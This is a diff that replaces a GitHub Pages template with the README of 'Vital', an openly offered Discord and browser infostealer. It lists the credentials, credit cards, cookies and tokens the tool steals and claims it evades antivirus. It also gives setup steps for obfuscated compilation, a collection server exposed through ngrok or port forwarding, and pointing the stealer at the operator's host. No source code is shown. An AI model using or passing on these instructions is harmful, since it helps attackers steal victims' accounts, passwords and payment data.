@@ -1,37 +1,59 @@
-## Welcome to GitHub Pages
+# Vital - Some Malware
+Malware for Discord, designed to steal passwords, tokens, and inject discord folders for long-term use. Utilizing older injection methods, bypasses anti-virus filters.
 
-You can use the [editor on GitHub](https://github.com/rpie/DisJack-V2/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.
+This Malware has the ability to steal Discord Tokens, Passwords, Browser Credit Cards, Browser Cookies, and other information.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+Vital supports, Discord, Canary, Lightcord, PTB, Opera, Opera GX, Amigo, Torch, Kometa, Orbitum, CentBrowser, 7star, Sputnik, Vivaldi, SxS, Chrome, Firefox, Privacy Browser, Edge, Uran, Brave, Yandex, and Iridium and adding more support for browsers soon.
 
-### Markdown
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+## What does this do?
+This virus has the ability to steal Discord Tokens, Passwords, Browser Credit Cards, Browser Cookies, and other information.
 
-```markdown
-Syntax highlighted code block
+This **IS** being updated so more will be added soon.
 
-# Header 1
-## Header 2
-### Header 3
+### What is the server for?
+The server is used to store credit card information and passwords. 
 
-- Bulleted
-- List
+### Change Log / What I want to add
+- [x] Discord Injector
+- [x] Token Grabber & Crawler
+- [x] Browser Card & Password Stealer
+- [x] Credit Card Stealer
+- [x] Minecraft Session Stealer
+- [ ] Multi-threading 
+- [ ] Wider Browser Support
+- [ ] Dynamic Server Support
+- [ ] Webcam Snap
+- [ ] Desktop Screenshot
+- [ ] File Crawler
 
-1. Numbered
-2. List
 
-**Bold** and _Italic_ and `Code` text
+## How to compile
+```bash
+python3 -m pip install pyinstaller
+pyarmor pack main.py --output DisJack.exe
+```
+### Server Setup
 
-[Link](url) and ![Image](src)
+#### Windows
+1. Download XAMPP from [here](https://www.apachefriends.org/xampp-files/7.3.30/xampp-windows-x64-7.3.30-0-VC15-installer.exe)
+
+2. Move server files into `C:\xampp\htdocs`
+
+3. Port forward or use ngrok ([tutorial for ngrok](https://www.sitepoint.com/use-ngrok-test-local-site/))
+
+4. Change the `credRec = ''` and put your IP/Webhost into the quotes *ex. `credRec = 'https://192.168.1.1/'`*
+
+5. Compile and start beaming
+
+#### Linux
+1. Move all server files to html `/home/var/www/html/`
+```bash
+sudo apt-get updatesudo apt-get install apache2
+sudo service apache2 restart
 ```
 
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
+## Debug Output
+<img src="https://transfer.sh/FYrksy/WindowsTerminal_RYcy9mjnS6.png">
 
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/rpie/DisJack-V2/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+#### I AM NOT RESPONSIBLE FOR ANY OF YOUR ACTIONS 
